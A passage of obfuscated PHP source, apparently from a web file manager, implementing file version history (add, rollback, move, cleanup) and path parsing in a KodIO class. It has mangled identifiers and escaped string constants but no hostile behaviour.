self::parsePath($”µÎó²[0]); if (!$óó¹£¦˜) { return; } $—ÙüíÁ = self::checkInHistory($óó¹£¦˜); if (!$—ÙüíÁ) { return; } if ($—ÙüíÁ[$Şºéñ©[33]] == $Şºéñ©[230]) { $ĞİŸ‚Ïù = self::listData($óó¹£¦˜); if ($ĞİŸ‚Ïù && $ĞİŸ‚Ïù[$Şºéñ©[446]]) { self::moveHistory($óó¹£¦˜, $”µÎó²[1]); } } else { IO::rename($—ÙüíÁ[$Şºéñ©[87]], $”µÎó²[1]); } } public static function eventBeforeMove($ŸĞ••) { $ôš‰´§î =& $_SERVER[ïÃ°£«Ê]; $Ó‘·ß·¤ = self::parsePath($ŸĞ••[0]); if (!$Ó‘·ß·¤) { return; } $¸æ±Ğİø = self::parsePath($ŸĞ••[1]); if (!$¸æ±Ğİø) { return; } $Ñ·ê‘ = $ŸĞ••[3]; $ş±›±ö = self::checkInHistory($Ó‘·ß·¤); if (!$ş±›±ö) { return; } $ÎœÔíµö = self::pathHistory($¸æ±Ğİø); if ($ş±›±ö[$ôš‰´§î[33]] == $ôš‰´§î[230]) { $á›Ç¼Ğ = self::listData($Ó‘·ß·¤); $’éøÚŸ¹ = rtrim($¸æ±Ğİø, $ôš‰´§î[8]) . $ôš‰´§î[8] . ($Ñ·ê‘ ? $Ñ·ê‘ : get_path_this($Ó‘·ß·¤)); $Âã¿“şÄ = self::listData($’éøÚŸ¹); if ($á›Ç¼Ğ && $á›Ç¼Ğ[$ôš‰´§î[446]] && $Âã¿“şÄ && $Âã¿“şÄ[$ôš‰´§î[446]]) { return self::clear($Ó‘·ß·¤); } if ($á›Ç¼Ğ && $á›Ç¼Ğ[$ôš‰´§î[446]]) { self::moveHistory($Ó‘·ß·¤, $Ñ·ê‘, $ÎœÔíµö); } } else { IO::move($ş±›±ö[$ôš‰´§î[87]], $ÎœÔíµö, !1, $Ñ·ê‘); self::clearEmptyFolder(IO::pathFather($ş±›±ö[$ôš‰´§î[87]])); } } public static function eventAfterRemove($ÔÕò€¤à, $ºğÛó§) { $¢äİ¸›® =& $_SERVER[ïÃ°£«Ê]; if (!$ºğÛó§) { return; } $Ô„½¹ë = self::parsePath($ÔÕò€¤à[0]); if (!$Ô„½¹ë) { return; } $¢ß›¹Ó¦ = self::checkInHistory($Ô„½¹ë); if (!$¢ß›¹Ó¦) { return; } if ($¢ß›¹Ó¦[$¢äİ¸›®[33]] == $¢äİ¸›®[230]) { $ã„¥À‚Ê = self::listData($Ô„½¹ë, !1); if ($ã„¥À‚Ê && $ã„¥À‚Ê[$¢äİ¸›®[446]]) { self::clear($Ô„½¹ë, !1); } } else { IO::remove($¢ß›¹Ó¦[$¢äİ¸›®[87]]); self::clearEmptyFolder(IO::pathFather($¢ß›¹Ó¦[$¢äİ¸›®[87]])); } } private static function checkInHistory($´·™ÕäÀ) { $òÅìâåœ = self::pathHistory($´·™ÕäÀ); if (!IO::exist($òÅìâåœ)) { $òÅìâåœ .= $_SERVER[ïÃ°£«Ê][1423]; } return IO::exist($òÅìâåœ) ? IO::info($òÅìâåœ) : !1; } private static function parsePath($“÷²éÈÌ) { $ãæşæĞ¹ =& $_SERVER[ïÃ°£«Ê]; if (!$“÷²éÈÌ) { return !1; } if (isset($GLOBALS[$ãæşæĞ¹[1424]]) && $GLOBALS[$ãæşæĞ¹[1424]]) { return; } $÷´Òşìê = KodIO::parse($“÷²éÈÌ); $³ıı¿ˆù = $÷´Òşìê[$ãæşæĞ¹[33]]; $úªıÔ Œ = !$³ıı¿ˆù || $³ıı¿ˆù == KodIO::KOD_IO || $³ıı¿ˆù == KodIO::KOD_SHARE_ITEM; if (!$úªıÔ Œ || !$÷´Òşìê[$ãæşæĞ¹[1425]]) { return !1; } if (substr($“÷²éÈÌ, 0, strlen(DATA_PATH . $ãæşæĞ¹[1426])) == DATA_PATH . $ãæşæĞ¹[1426]) { return !1; } if ($³ıı¿ˆù == KodIO::KOD_SHARE_ITEM) { $‚ïß£íØ = IO::init($“÷²éÈÌ); if ($‚ïß£íØ->pathParse[$ãæşæĞ¹[1339]]) { return self::parsePath($‚ïß£íØ->pathParse[$ãæşæĞ¹[1339]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $§ı æê¡ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ãæşæĞ¹[1427]); foreach ($§ı æê¡ as $ˆ‰¶òúÏ) { if (!$³ıı¿ˆù && substr($“÷²éÈÌ, 0, strlen($ˆ‰¶òúÏ)) == $ˆ‰¶òúÏ) { return !1; } } self::log($GLOBALS[$ãæşæĞ¹[1333]] . $ãæşæĞ¹[1428] . $“÷²éÈÌ); return $“÷²éÈÌ; } private static function pathHistory($ï¼Û²¥) { $Ëöº›µ– =& $_SERVER[ïÃ°£«Ê]; $Ùî“Şêì = self::$_historyBase . ltrim(KodIO::clear($ï¼Û²¥), $Ëöº›µ–[8]); $Ùî“Şêì = str_replace(array($Ëöº›µ–[1429]), array($Ëöº›µ–[1430]), $Ùî“Şêì); return $Ùî“Şêì; } public static function log($Õ”½·Œ) { } public static function historyCount($ô¥‡¯‚‚) { $êíñáö =& $_SERVER[ïÃ°£«Ê]; $ŞüÖÕÒˆ = array(); $ø‚™º¡¸ = array(); foreach ($ô¥‡¯‚‚ as $ÀøäËù‡) { $¸¡ÊÓß = get_path_father($ÀøäËù‡); if (!$ø‚™º¡¸[$¸¡ÊÓß]) { $ø‚™º¡¸[$¸¡ÊÓß] = array(); } $ø‚™º¡¸[$¸¡ÊÓß][] = get_path_this($ÀøäËù‡); } foreach ($ø‚™º¡¸ as $¸¡ÊÓß => $×¸øŠ“) { $ô®ùé¾ı = self::parsePath($¸¡ÊÓß); if (!$ô®ùé¾ı) { continue; } foreach ($×¸øŠ“ as $ÈÃ¯ü) { $×ï±¾› = self::listData(rtrim($ô®ùé¾ı, $êíñáö[8]) . $êíñáö[8] . $ÈÃ¯ü, !1); if ($×ï±¾› && $×ï±¾›[$êíñáö[446]]) { $ŞüÖÕÒˆ[rtrim($¸¡ÊÓß, $êíñáö[8]) . $êíñáö[8] . $ÈÃ¯ü] = count($×ï±¾›[$êíñáö[446]]); } } } return $ŞüÖÕÒˆ; } public static function add($ÌøîÄ¼Î) { $‡‡çµİ• =& $_SERVER[ïÃ°£«Ê]; $‘¦¬ÖƒÈ = self::listData($ÌøîÄ¼Î); if (!$‘¦¬ÖƒÈ) { return; } $ÚÇ“ß = Model($‡‡çµİ•[874])->get($‡‡çµİ•[962]); $™îÕ¡î = intval($GLOBALS[$‡‡çµİ•[6]][$‡‡çµİ•[92]][$‡‡çµİ•[1409]]); $º˜ÚÆˆŠ = $ÚÇ“ß == $‡‡çµİ•[963] ? min(5, $™îÕ¡î) : $™îÕ¡î; if ($™îÕ¡î <= 0) { return; } $ï—´Å·¸ = IO::info($ÌøîÄ¼Î); $× Ç†ŠŠ = $‘¦¬ÖƒÈ[$‡‡çµİ•[446]]; if ($ï—´Å·¸[$‡‡çµİ•[79]] == 0) { return; } if ($ï—´Å·¸[$‡‡çµİ•[79]] >= 1024 * 1024 * 500) { return !1; } $²™ğü£ = IO::hashSimple($ÌøîÄ¼Î); if ($× Ç†ŠŠ && $× Ç†ŠŠ[0][$‡‡çµİ•[694]] == $²™ğü£) { return !0; } if (array_key_exists($‡‡çµİ•[233], $ï—´Å·¸) && !$ï—´Å·¸[$‡‡çµİ•[233]]) { return !1; } $æ”Õƒ˜ = short_id(time()); $ÊÕ… ±í = array($‡‡çµİ•[487] => $æ”Õƒ˜, $‡‡çµİ•[694] => $²™ğü£, $‡‡çµİ•[32] => $ï—´Å·¸[$‡‡çµİ•[32]] . $‡‡çµİ•[10] . date($‡‡çµİ•[1431]) . rand_string(1), $‡‡çµİ•[79] => $ï—´Å·¸[$‡‡çµİ•[79]], $‡‡çµİ•[541] => USER_ID, $‡‡çµİ•[231] => time(), $‡‡çµİ•[1432] => $‡‡çµİ•[12]); IO::mkdir($‘¦¬ÖƒÈ[$‡‡çµİ•[1433]]); $°ˆå©ñÑ = IO::copy($ÌøîÄ¼Î, $‘¦¬ÖƒÈ[$‡‡çµİ•[1433]], !1, $ÊÕ… ±í[$‡‡çµİ•[32]]); if (!$°ˆå©ñÑ) { self::clearEmptyFolder($‘¦¬ÖƒÈ[$‡‡çµİ•[1433]]); return !1; } array_unshift($× Ç†ŠŠ, $ÊÕ… ±í); if (count($× Ç†ŠŠ) > $º˜ÚÆˆŠ) { $İ±àªä« = array_slice($× Ç†ŠŠ, $º˜ÚÆˆŠ); foreach ($İ±àªä« as $ê€û¡ˆ‹) { IO::remove($‘¦¬ÖƒÈ[$‡‡çµİ•[1433]] . $ê€û¡ˆ‹[$‡‡çµİ•[32]]); } $× Ç†ŠŠ = array_slice($× Ç†ŠŠ, 0, $º˜ÚÆˆŠ); } return self::saveData($‘¦¬ÖƒÈ[$‡‡çµİ•[1434]], $× Ç†ŠŠ); } public static function remove($êì»¾Ê¯, $›³è†»ö) { $ÜšÜÌğß =& $_SERVER[ïÃ°£«Ê]; $ä¬ÓîÊ = self::listData($êì»¾Ê¯); $¼„…¥ù = array(); if (!$ä¬ÓîÊ) { return !1; } foreach ($ä¬ÓîÊ[$ÜšÜÌğß[446]] as $ù¶âç”ë) { if ($ù¶âç”ë[$ÜšÜÌğß[487]] == $›³è†»ö) { IO::remove($ä¬ÓîÊ[$ÜšÜÌğß[1433]] . $ù¶âç”ë[$ÜšÜÌğß[32]]); continue; } $¼„…¥ù[] = $ù¶âç”ë; } return self::saveData($ä¬ÓîÊ[$ÜšÜÌğß[1434]], $¼„…¥ù); } public static function clear($¬¢Ùé, $ÔèØô½ñ = true) { $‰ıª³Ç² =& $_SERVER[ïÃ°£«Ê]; $¸šª”Ç¯ = self::listData($¬¢Ùé, $ÔèØô½ñ); if (!$¸šª”Ç¯) { return !1; } foreach ($¸šª”Ç¯[$‰ıª³Ç²[446]] as $Ôåñ·Ä¡) { IO::remove($¸šª”Ç¯[$‰ıª³Ç²[1433]] . $Ôåñ·Ä¡[$‰ıª³Ç²[32]]); } return self::saveData($¸šª”Ç¯[$‰ıª³Ç²[1434]], array()); } public static function moveHistory($µñÚâİ¥, $§Úøˆê« = '', $†¢¸Âá« = '') { $ ×ƒÂ’Á =& $_SERVER[ïÃ°£«Ê]; $ÃÎ·Ğôğ = self::listData($µñÚâİ¥, !1); if (!$ÃÎ·Ğôğ || !$ÃÎ·Ğôğ[$ ×ƒÂ’Á[446]]) { return !1; } $ÁªÑÒëÃ = $ ×ƒÂ’Á[1423]; $§Úøˆê« = $§Úøˆê« ? $§Úøˆê« : get_path_this($µñÚâİ¥); $†¢¸Âá« = $†¢¸Âá« ? $†¢¸Âá« : $ÃÎ·Ğôğ[$ ×ƒÂ’Á[1433]]; $éÔ›Á±ı = substr(get_path_this($ÃÎ·Ğôğ[$ ×ƒÂ’Á[1434]]), 0, -strlen($ÁªÑÒëÃ)); foreach ($ÃÎ·Ğôğ[$ ×ƒÂ’Á[446]] as $§òˆšë¡ => $‹ğéœÊ) { $«ıãÍÄ¸ = $§Úøˆê« . substr($‹ğéœÊ[$ ×ƒÂ’Á[32]], strlen($éÔ›Á±ı)); $Ä’‘²¹À = IO::move($ÃÎ·Ğôğ[$ ×ƒÂ’Á[1433]] . $‹ğéœÊ[$ ×ƒÂ’Á[32]], $†¢¸Âá«, !1, $«ıãÍÄ¸); if ($Ä’‘²¹À) { $ÃÎ·Ğôğ[$ ×ƒÂ’Á[446]][$§òˆšë¡][$ ×ƒÂ’Á[32]] = $«ıãÍÄ¸; } } $ÃÎ·Ğôğ[$ ×ƒÂ’Á[1434]] = IO::move($ÃÎ·Ğôğ[$ ×ƒÂ’Á[1434]], $†¢¸Âá«, !1, $§Úøˆê« . $ÁªÑÒëÃ); self::saveData($ÃÎ·Ğôğ[$ ×ƒÂ’Á[1434]], $ÃÎ·Ğôğ[$ ×ƒÂ’Á[446]]); self::clearEmptyFolder($ÃÎ·Ğôğ[$ ×ƒÂ’Á[1433]]); } public static function rollback($Ÿ–®’Ó², $œ‡±Ş©Œ) { $å›—¼ØĞ =& $_SERVER[ïÃ°£«Ê]; $ÈÑ„ô…Í = self::listData($Ÿ–®’Ó²); if (!$ÈÑ„ô…Í) { return; } $üË«öØ = IO::info($Ÿ–®’Ó²); foreach ($ÈÑ„ô…Í[$å›—¼ØĞ[446]] as $”ïë°¡ô => $ÎÑõ£Çä) { if ($ÎÑõ£Çä[$å›—¼ØĞ[487]] == $œ‡±Ş©Œ) { self::add($Ÿ–®’Ó²); $ÃÕ–ß–¶ = $ÈÑ„ô…Í[$å›—¼ØĞ[1433]] . $ÎÑõ£Çä[$å›—¼ØĞ[32]]; $«€Ï¢À‰ = IO::copy($ÃÕ–ß–¶, IO::pathFather($Ÿ–®’Ó²), REPEAT_REPLACE, $üË«öØ[$å›—¼ØĞ[32]]); if ($«€Ï¢À‰) { self::remove($Ÿ–®’Ó², $œ‡±Ş©Œ); } return $«€Ï¢À‰; } } return !1; } public static function setDetail($Ö³‘Öö, $îô­¹ñø, $Ò¢‡Î®) { $ğª§Æ¦¬ =& $_SERVER[ïÃ°£«Ê]; $à•ùî÷ = self::listData($Ö³‘Öö); if (!$à•ùî÷) { return; } foreach ($à•ùî÷[$ğª§Æ¦¬[446]] as $ÁÑã³ïù => $ÛÕ€æˆ¢) { if ($ÛÕ€æˆ¢[$ğª§Æ¦¬[487]] == $îô­¹ñø) { $à•ùî÷[$ğª§Æ¦¬[446]][$ÁÑã³ïù][$ğª§Æ¦¬[1432]] = $Ò¢‡Î®; self::saveData($à•ùî÷[$ğª§Æ¦¬[1434]], $à•ùî÷[$ğª§Æ¦¬[446]]); return !0; } } return !1; } public static function fileInfo($€ˆàôó, $Ò©…ğß‹) { $÷ğéõ’  =& $_SERVER[ïÃ°£«Ê]; $×Ûø¿ÏÙ = self::listData($€ˆàôó); if (!$×Ûø¿ÏÙ) { show_json(LNG($÷ğéõ’ [105]), !1); } $÷ìô¡ã× = $÷ğéõ’ [12]; foreach ($×Ûø¿ÏÙ[$÷ğéõ’ [446]] as $õ¡¦Ì‚Ü => $ÃÙ³ñÆÌ) { if ($ÃÙ³ñÆÌ[$÷ğéõ’ [487]] != $Ò©…ğß‹) { continue; } $÷ìô¡ã× = $×Ûø¿ÏÙ[$÷ğéõ’ [1433]] . $ÃÙ³ñÆÌ[$÷ğéõ’ [32]]; break; } if (!$÷ìô¡ã×) { show_json(LNG($÷ğéõ’ [105]), !1); } return IO::info($÷ìô¡ã×); } public static function fileOut($Ô´ÅÔ, $°ñ¤™Ú, $››—ô€½ = false) { $­§ñÚç« =& $_SERVER[ïÃ°£«Ê]; $™½ôš° = self::fileInfo($Ô´ÅÔ, $°ñ¤™Ú); $ğğÀ—¿ =& $GLOBALS[$­§ñÚç«[7]]; $››—ô€½ = isset($ğğÀ—¿[$­§ñÚç«[1387]]) && $ğğÀ—¿[$­§ñÚç«[1387]] == 1; if (isset($ğğÀ—¿[$­§ñÚç«[33]]) && $ğğÀ—¿[$­§ñÚç«[33]] == $­§ñÚç«[1435]) { return IO::fileOutImage($™½ôš°[$­§ñÚç«[87]], $ğğÀ—¿[$­§ñÚç«[1436]]); } IO::fileOut($™½ôš°[$­§ñÚç«[87]], $››—ô€½, get_path_this($Ô´ÅÔ)); } public static function listData($€Ö“‡àÁ, $±®ş²Ûˆ = true) { $‘¹éø»­ =& $_SERVER[ïÃ°£«Ê]; if ($±®ş²Ûˆ && !IO::exist($€Ö“‡àÁ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($€Ö“‡àÁ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ø–²½ê = self::pathHistory($€Ö“‡àÁ); $ĞÕÃË = array($‘¹éø»­[1434] => $Ø–²½ê . $‘¹éø»­[1423], $‘¹éø»­[1433] => rtrim(get_path_father($Ø–²½ê), $‘¹éø»­[8]) . $‘¹éø»­[8], $‘¹éø»­[446] => array()); $†á¸ßÉ = IO::getContent($ĞÕÃË[$‘¹éø»­[1434]]); if ($†á¸ßÉ) { $¾‹´Úó = json_decode($†á¸ßÉ, !0); if (is_array($¾‹´Úó)) { $ĞÕÃË[$‘¹éø»­[446]] = $¾‹´Úó; } } return $ĞÕÃË; } private static function saveData($…‚Şüøó, $ı‰Áõ™Ö) { $ñç¤–ºò =& $_SERVER[ïÃ°£«Ê]; self::log($ñç¤–ºò[1437] . $…‚Şüøó . $ñç¤–ºò[74] . count($ı‰Áõ™Ö), $ñç¤–ºò[853]); if ($ı‰Áõ™Ö) { return IO::setContent($…‚Şüøó, json_encode($ı‰Áõ™Ö)); } $æŠ”«‹ = IO::pathFather($…‚Şüøó); IO::remove($…‚Şüøó); self::clearEmptyFolder($æŠ”«‹); return !0; } public static function clearEmptyFolder($ à¿ù×ó) { $µÄ ½½ =& $_SERVER[ïÃ°£«Ê]; if (trim($ à¿ù×ó, $µÄ ½½[8]) == trim(self::$_historyBase, $µÄ ½½[8])) { return; } $ŸÌßØî³ = IO::pathFather($ à¿ù×ó); $”öãÕä = IO::has($ à¿ù×ó, !0); if ($”öãÕä[$µÄ ½½[239]] > 0 || $”öãÕä[$µÄ ½½[240]] > 0) { return; } IO::remove($ à¿ù×ó); self::clearEmptyFolder($ŸÌßØî³); } private static function getBasePath() { $±Ñ¹Ôğ› =& $_SERVER[ïÃ°£«Ê]; $‰ı˜áüâ = Model($±Ñ¹Ôğ›[1438])->get($±Ñ¹Ôğ›[1439]); if ($‰ı˜áüâ) { if (!IO::exist($‰ı˜áüâ)) { IO::mkdir($‰ı˜áüâ); } if (get_path_this($‰ı˜áüâ) == $±Ñ¹Ôğ›[1426]) { $ˆü¼ÉÏ® = $±Ñ¹Ôğ›[1440] . rand_string(8); @rename($‰ı˜áüâ, get_path_father($‰ı˜áüâ) . $±Ñ¹Ôğ›[8] . $ˆü¼ÉÏ®); $‰ı˜áüâ = DATA_PATH . $ˆü¼ÉÏ® . $±Ñ¹Ôğ›[8]; file_put_contents(DATA_PATH . $±Ñ¹Ôğ›[1375], $±Ñ¹Ôğ›[12]); Model($±Ñ¹Ôğ›[1438])->set($±Ñ¹Ôğ›[1439], $‰ı˜áüâ); } return $‰ı˜áüâ; } $‰ı˜áüâ = DATA_PATH . $±Ñ¹Ôğ›[1440] . rand_string(8) . $±Ñ¹Ôğ›[8]; $‰ı˜áüâ = IO::mkdir($‰ı˜áüâ); $‰ı˜áüâ = rtrim($‰ı˜áüâ, $±Ñ¹Ôğ›[8]) . $±Ñ¹Ôğ›[8]; file_put_contents($‰ı˜áüâ . $±Ñ¹Ôğ›[1375], $±Ñ¹Ôğ›[12]); file_put_contents(DATA_PATH . $±Ñ¹Ôğ›[1375], $±Ñ¹Ôğ›[12]); Model($±Ñ¹Ôğ›[1438])->set($±Ñ¹Ôğ›[1439], $‰ı˜áüâ); return $‰ı˜áüâ; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\122\x65\x63\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\162\x46\151\x6c\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\x46\x69\154\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\x52\157\157\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\163\145\162\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\150\141\162\x65\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\x65\124\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\x74\x65\155\x4c\x69\x6e\x6b\175"; const KOD_SHARE_OUTER = "\173\x73\150\x61\162\x65\111\164\x65\x6d\x4f\x75\x74\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\x68\175"; const KOD_BLOCK = "\173\142\154\157\143\x6b\x7d"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\156\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\x65\x72\175"; public static function typeList() { $¡‚··É =& $_SERVER[ïÃ°£«Ê]; return array($¡‚··É[1441] => self::KOD_SOURCE, $¡‚··É[1442] => self::KOD_USER_RECYCLE, $¡‚··É[1443] => self::KOD_USER_FAV, $¡‚··É[1444] => self::KOD_USER_FILE_TAG, $¡‚··É[1445] => self::KOD_USER_FILE_TYPE, $¡‚··É[1446] => self::KOD_GROUP_ROOT_SELF, $¡‚··É[1447] => self::KOD_USER_SHARE, $¡‚··É[1448] => self::KOD_USER_SHARE_LINK, $¡‚··É[1449] => self::KOD_USER_SHARE_TO_ME, $¡‚··É[1450] => self::KOD_SHARE_ITEM, $¡‚··É[1451] => self::KOD_SHARE_LINK, $¡‚··É[1452] => self::KOD_SHARE_OUTER, $¡‚··É[1453] => self::KOD_SEARCH, $¡‚··É[1454] => self::KOD_BLOCK, $¡‚··É[1455] => self::KOD_IO, $¡‚··É[1456] => self::KOD_USER_RECENT, $¡‚··É[1457] => self::KOD_USER_DRIVER); } public static function parse($ÌæÜ± Ù) { $ ı¥É³é =& $_SERVER[ïÃ°£«Ê]; $ÌæÜ± Ù = self::clear($ÌæÜ± Ù); $ïç´ª· = array_values(self::typeList()); preg_match($ ı¥É³é[1458], $ÌæÜ± Ù, $»ØëßÙú); $ŞşèÄ¦Ä = array($ ı¥É³é[511] => !1, $ ı¥É³é[1459] => !1, $ ı¥É³é[508] => !1, $ ı¥É³é[87] => $ÌæÜ± Ù, $ ı¥É³é[1359] => !1, $ ı¥É³é[1358] => $ ı¥É³é[12]); if (is_array($»ØëßÙú) && count($»ØëßÙú) == 5) { $­ÈÛ¢Şê = $ ı¥É³é[1460] . $»ØëßÙú[2] . $ ı¥É³é[402]; if (in_array($­ÈÛ¢Şê, $ïç´ª·)) { $ŞşèÄ¦Ä[$ ı¥É³é[1359]] = $»ØëßÙú[1]; $ŞşèÄ¦Ä[$ ı¥É³é[33]] = $­ÈÛ¢Şê; $ŞşèÄ¦Ä[$ ı¥É³é[1461]] = substr($­ÈÛ¢Şê, 1, -1); $ŞşèÄ¦Ä[$ ı¥É³é[487]] = $»ØëßÙú[3]; } $ŞşèÄ¦Ä[$ ı¥É³é[1358]] = $»ØëßÙú[4]; } if ($ŞşèÄ¦Ä[$ ı¥É³é[511]] == self::KOD_SOURCE) { $ŞşèÄ¦Ä[$ ı¥É³é[487]] = intval($ŞşèÄ¦Ä[$ ı¥É³é[487]]); $ŞşèÄ¦Ä[$ ı¥É³é[1362]] = $ŞşèÄ¦Ä[$ ı¥É³é[487]]; } $»ØÀ±¯ç = array($ ı¥É³é[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ŞşèÄ¦Ä[$ ı¥É³é[1425]] = in_array($ŞşèÄ¦Ä[$ ı¥É³é[33]], $»ØÀ±¯ç); return $ŞşèÄ¦Ä; } public static function isTruePath($¦°œüÚ) { $à×Ùµ¨ =& $_SERVER[ïÃ°£«Ê]; if (substr($¦°œüÚ, 0, 1) != $à×Ùµ¨[1460]) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[498]) === 0) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[1429]) === 0) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[1462]) === 0) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[1463]) === 0) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[1464]) === 0) { return !0; } if (strpos($¦°œüÚ, $à×Ùµ¨[1465]) === 0) { return !0; } return !1; } public static function clear($•şØÉŸ›) { $¶Ÿ¯¡Üœ =& $_SERVER[ïÃ°£«Ê]; $•şØÉŸ› = str_replace(array($¶Ÿ¯¡Üœ[1252], $¶Ÿ¯¡Üœ[285]), $¶Ÿ¯¡Üœ[53], $•şØÉŸ›); $•şØÉŸ› = str_replace($¶Ÿ¯¡Üœ[97], $¶Ÿ¯¡Üœ[8], $•şØÉŸ›); $Ÿë¢˜ÒÉ = $¶Ÿ¯¡Üœ[1466]; if (substr($•şØÉŸ›, 0, 3) == $¶Ÿ¯¡Üœ[1467]) { $•şØÉŸ› = substr($•şØÉŸ›, 3); } while (strstr($•şØÉŸ›, $Ÿë¢˜ÒÉ)) { $•şØÉŸ› = str_replace($Ÿë¢˜ÒÉ, $¶Ÿ¯¡Üœ[8], $•şØÉŸ›); } $•şØÉŸ› = preg_replace($¶Ÿ¯¡Üœ[1468], $¶Ÿ¯¡Üœ[8], $•şØÉŸ›); if ($•şØÉŸ› == $¶Ÿ¯¡Üœ[8]) { return $¶Ÿ¯¡Üœ[8]; } $•şØÉŸ› = rtrim($•şØÉŸ›, $¶Ÿ¯¡Üœ[8]); return $•şØÉŸ›; } public static function pathTrue($É¿¡‹ãî) { $¶“òÛÚ© =& $_SERVER[ïÃ°£«Ê]; if (!$É¿¡‹ãî) { return $¶“òÛÚ©[12]; } $É¿¡‹ãî = str_replace($¶“òÛÚ©[254], $¶“òÛÚ©[8], str_replace($¶“òÛÚ©[1469], $¶“òÛÚ©[8], $É¿¡‹ãî)); $É¿¡‹ãî = str_replace($¶“òÛÚ©[254], $¶“òÛÚ©[8], str_replace($¶“òÛÚ©[1469], $¶“òÛÚ©[8], $É¿¡‹ãî)); if (!strstr($É¿¡‹ãî, $¶“òÛÚ©[1467])) { return $É¿¡‹ãî; } $¢İ©í° = explode($¶“òÛÚ©[8], $É¿¡‹ãî); foreach ($¢İ©í° as $ÊÍÁŠæÙ => $Šéüó£) { if ($Šéüó£ !== $¶“òÛÚ©[1470]) { continue; } for ($„µêë£™ = $ÊÍÁŠæÙ; $„µêë£™ >= 0; $„µêë£™--) { if ($¢İ©í°[$„µêë£™] === $¶“òÛÚ©[10] || $¢İ©í°[$„µêë£™] === $¶“òÛÚ©[1470] || $¢İ©í°[$„µêë£™] === -1) { continue; } if ($¢İ©í°[$„µêë£™] === $¶“òÛÚ©[12]) { $¢İ©í°[$ÊÍÁŠæÙ] = -1; break; } $¢İ©í°[$ÊÍÁŠæÙ] = -1; $¢İ©í°[$„µêë£™] = -1; break; } } $ôáŞŞ² = array(); foreach ($¢İ©í° as $Šéüó£) { if ($Šéüó£ !== -1) { $ôáŞŞ²[] = $Šéüó£; } } $¯ò‡‚•¤ = implode($¶“òÛÚ©[8], $ôáŞŞ²); if (strpos($¯ò‡‚•¤, $¶“òÛÚ©[1471]) === 0) { $¯ò‡‚•¤ = $¶“òÛÚ©[1467] . substr($¯ò‡‚•¤, strlen($¶“òÛÚ©[1471])); } return $¯ò‡‚•¤; } public static function pathUrlClear($æ¶ßŒçÁ) { $·´òÆ‹Ö =& $_SERVER[ïÃ°£«Ê]; if (!$æ¶ßŒçÁ) { return $æ¶ßŒçÁ; } $æ¶ßŒçÁ = rawurldecode($æ¶ßŒçÁ); $æ¶ßŒçÁ = str_replace($·´òÆ‹Ö[1469], $·´òÆ‹Ö[8], $æ¶ßŒçÁ); if (strpos($æ¶ßŒçÁ, $·´òÆ‹Ö[76]) > 0) { $æ¶ßŒçÁ = substr($æ¶ßŒçÁ, 0, strpos($æ¶ßŒçÁ, $·´òÆ‹Ö[76])); } if (strpos($æ¶ßŒçÁ, $·´òÆ‹Ö[1472]) > 0) { $æ¶ßŒçÁ = substr($æ¶ßŒçÁ, 0, strpos($æ¶ßŒçÁ, $·´òÆ‹Ö[1472])); } return $æ¶ßŒçÁ; } public static function sourceID($°ÈÑ€øœ) { $ğûÜÔÙ“ =& $_SERVER[ïÃ°£«Ê]; $”¦©ÒÁ• = self::parse($°ÈÑ€øœ); if ($”¦©ÒÁ•[$ğûÜÔÙ“[33]] !== self::KOD_SOURCE) { show_json(LNG($ğûÜÔÙ“[1473]), !1); } return $”¦©ÒÁ•[$ğûÜÔÙ“[487]]; } public static function make($¨ÇãÖé) { if (!$¨ÇãÖé) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¨ÇãÖé)); } public static function makeShare($áÛï‘–³, $Åš×ş¯) { return self::makePath(self::KOD_SHARE_ITEM, $áÛï‘–³, $Åš×ş¯); } public static function makeFileTypePath($œ‘ù…¸Œ) { return self::makePath(self::KOD_USER_FILE_TYPE, $œ‘ù…¸Œ); } public static function makeFileTagPath($¸©•¾İÛ) { return self::makePath(self::KOD_USER_FILE_TAG, $¸©•¾İÛ); } public static function makePath($×›ãèº‹, $ÇÖ²–Â® = '', $ø£­ì´® = '') { $¬…š÷Úş =& $_SERVER[ïÃ°£«Ê]; $©ßÃ‘Å¼ = substr($×›ãèº‹, 1, -1); $ú…”±„÷ = $¬…š÷Úş[1474] . $©ßÃ‘Å¼ . $¬…š÷Úş[1475] . $ÇÖ²–Â® . $¬…š÷Úş[1476]; $ú…”±„÷ = $ø£­ì´® ? $ú…”±„÷ . $ø£­ì´® . $¬…š÷Úş[8] : $ú…”±„÷; return $ú…”±„÷; } public static function hashPath($Õì‘ÓÊŒ, $½¡ˆ£³  = false) { $ô»–¬öñ =& $_SERVER[ïÃ°£«Ê]; if (!$Õì‘ÓÊŒ) { return $ô»–¬öñ[12]; } $°ÈúÂÙÔ = is_array($Õì‘ÓÊŒ) ? $Õì‘ÓÊŒ : 